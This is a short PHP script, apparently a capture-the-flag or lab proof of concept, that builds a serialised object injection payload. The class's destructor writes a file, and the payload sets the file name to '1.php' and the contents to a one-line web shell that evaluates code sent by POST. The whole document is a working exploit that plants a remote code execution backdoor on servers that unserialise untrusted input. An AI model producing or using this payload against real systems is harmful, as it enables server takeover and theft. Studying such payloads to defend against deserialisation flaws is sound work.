
<?php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
echo urlencode(serialize(new user('1.php','<?php eval($_POST[1]);?>')));
?>